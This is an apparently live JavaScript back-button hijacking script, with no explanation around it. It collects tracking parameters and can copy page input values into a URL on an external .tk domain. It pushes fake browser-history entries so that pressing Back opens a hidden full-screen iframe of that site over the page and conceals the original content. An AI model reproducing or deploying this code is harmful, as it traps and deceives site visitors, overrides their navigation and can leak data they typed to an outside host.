(function () { const Url =  "https://lichardriracheacirc.tk/W1txdxsZ";

    const Depth = 2,
          ReloadStreamUUID = 'cb64f855-1095-43ea-b0a0-cd26d15a3bf5';
     
   

    function getSearchParameters() {
        var prmstr = window.location.search.substr(1);
        return prmstr != null && prmstr != "" ? transformToAssocArray(prmstr) : {};
    }
    
    function transformToAssocArray( prmstr ) {
        var params = {};
        var prmarr = prmstr.split("&");
        for ( var i = 0; i < prmarr.length; i++) {
            var tmparr = prmarr[i].split("=");
            params[tmparr[0]] = tmparr[1];
        }
        return params;
    }
       
    var params = getSearchParameters();
    
    var subid = '';
    // var sub1 = '';
    var sub2 = '';
    var sub3 = '';
    var sub4 = '';
    var sub5 = '';
    var utm_source = '';
    var utm_campaign = '';
    var utm_content = '';
    var utm_term = '';
    var utm_medium = '';
    if (params !== undefined) {
        
        // if (params.sub1 !== undefined) {
        //     sub1 = '&sub1='+params.sub1;
        // }
        if (params.sub2 !== undefined) {
            sub2 = '&sub2='+params.sub2;
        }
        if (params.sub3 !== undefined) {
            sub3 = '&sub3='+params.sub3;
        }
        if (params.sub4 !== undefined) {
            sub4 = '&sub4='+params.sub4;
        }
        if (params.sub5 !== undefined) {
            sub5 = '&sub5='+params.sub5;
        }
        if (params.utm_source !== undefined) {
            utm_source = '&utm_source='+params.utm_source;
        }
        if (params.utm_campaign !== undefined) {
            utm_campaign = '&utm_campaign='+params.utm_campaign;
        }
        if (params.utm_content !== undefined) {
            utm_content = '&utm_content='+params.utm_content;
        }
        if (params.utm_term !== undefined) {
            utm_term = '&utm_term='+params.utm_term;
        }
        if (params.utm_medium !== undefined) {
            utm_medium = '&utm_medium='+params.utm_medium;
        }
      
        subid = '?s'+sub2+sub3+sub4+sub5+utm_source+utm_campaign+utm_content+utm_term+utm_medium;
        }
    
    console.log(params);
    console.log(Url+subid);
    
    var serialObj = JSON.stringify(params);
    localStorage.setItem("params", serialObj); 

    const backlink = replaceMacros(Url+subid);

  var redFlag = false,
      disabled = false;

      
          disabled = (document.cookie.indexOf('disableBackfix') !== -1);
  document.addEventListener("DOMContentLoaded", function () {
      document.querySelectorAll("form").forEach(function (value) {
          value.addEventListener("submit", function () {
              disabled = true;
              document.cookie = 'disableBackfix=1;expires=' + (new Date(Date.now() + 60 * 5 * 1000)).toGMTString();
          });
      });
  });
  
      if (document.readyState === 'complete' || document.readyState === 'loaded' || document.readyState === 'interactive') {
      brave();
  } else {
      document.addEventListener("DOMContentLoaded", brave);
  }

  function brave() {
              if (disabled === true) {
          return;
      }

      var links = document.getElementsByTagName('a');

      for (var i = 0; i < links.length; i++) {
          links[i].addEventListener("click", function () {
              redFlag = true;
          });
      }

      backInFrame(backlink);
  }

  function replaceMacros(backLink) {
      const DefaultMacroValue = 'unknown',
          regexpQueryParams = /(\w+)=\[(.+?)]/g,
          regexpDocumentInputs = /input\[(.+?)]/g;

      try {
          var url = new URL(location.href);

          backLink = backLink.replace(regexpQueryParams, function (all, replaceQueryParamName, urlQueryParamName) {
              var value;

              value = url.searchParams.has(urlQueryParamName)
                  ? url.searchParams.get(urlQueryParamName)
                  : DefaultMacroValue;

              const IsParamStream = replaceQueryParamName === "stream_uuid",
                  IsParamValueUUIDv4 = /^[0-9A-F]{8}-[0-9A-F]{4}-[4][0-9A-F]{3}-[89AB][0-9A-F]{3}-[0-9A-F]{12}$/i.test(value) === true,
                  IsReplaceStreamEnabled = false;

                              if (IsParamStream && !(IsReplaceStreamEnabled && IsParamValueUUIDv4)) {
                  value = ReloadStreamUUID;
              }

              return replaceQueryParamName + "=" + value;
          });

          backLink = backLink.replace(regexpDocumentInputs, function (all, key) {
              var inputs = document.querySelectorAll("input[name=" + key + "]");

              if (inputs.length === 1) {
                  return inputs[0].value;
              }

              return DefaultMacroValue;
          });

          return backLink;
      } catch (err) {
          console.error(err);
          return backLink;
      }
  }

  function backInFrame(backLink) {
      var frame = document.createElement('iframe');
      frame.style.width = '100%';
      frame.id = 'domonet';
      frame.name = 'domonet';
      frame.style.height = '100vh';
      frame.style.position = 'fixed';
      frame.style.top = 0;
      frame.style.left = 0;
      frame.style.border = 'none';
      frame.style.zIndex = 999997;
      frame.style.display = 'none';
      frame.style.backgroundColor = '#fff';
      frame.setAttribute("src", backLink);

      for (var t = 0; Depth > t; ++t) window.history.pushState({}, '', window.location.href + '#' + t);

      if (!isIos()) {
          checkUserGesture(function () {
              for (var t = 0; Depth > t; ++t) window.history.pushState({}, '', window.location.href + '#' + t);
          });
      }

      document.body.append(frame);

      window.onpopstate = function (t) {
          setTimeout(
              function () {
                  if (redFlag === true) {
                      redFlag = false;
                      return;
                  }

                  if (disabled === true) {
                                              history.go(-Depth);
                      return;
                  }

                  if (getUrlVar('frame') === 1 || isInIframe()) return;

                  if (!isIos() && !!!t.state) return;

                  document.body.style.overflow = 'hidden';
                  frame.style.display = "block";
                                                          document.querySelectorAll("body > *:not(#domonet)").forEach(function (e) {
                      e.setAttribute('style', 'display:none;');
                  });
              },
              10
          );
      };
  }

  function getUrlVar(key) {
      var p = window.location.search;
      p = p.match(new RegExp('[?&]{1}(?:' + key + '=([^&$#=]+))'));
      return p ? p[1] : '';
  }

  function isInIframe() {
      try {
          return window != window.top || document != top.document || self.location != top.location;
      } catch (e) {
          return true;
      }
  }

  function checkUserGesture(callback) {
      var st = setInterval(function () {
          var audio = document.createElement('audio');
          var playPromise = audio.play();
          if (playPromise instanceof Promise) {
              if (!audio.paused) {
                  clearInterval(st);
                  callback();
              }
              playPromise.then(function (e) {

              }).catch(function (error) {

              });
          } else {
              if (!audio.paused) {
                  clearInterval(st);
                  callback();
              }
          }
      }, 100);
  }

  function isIos() {
      return [
          'iPad Simulator',
          'iPhone Simulator',
          'iPod Simulator',
          'iPad',
          'iPhone',
          'iPod',
          'Macintosh',
          'MacIntel',
          'MacPPC',
          'Mac68K',
          'Mac68K'
      ].indexOf(navigator.platform) !== -1;
  }
})(window);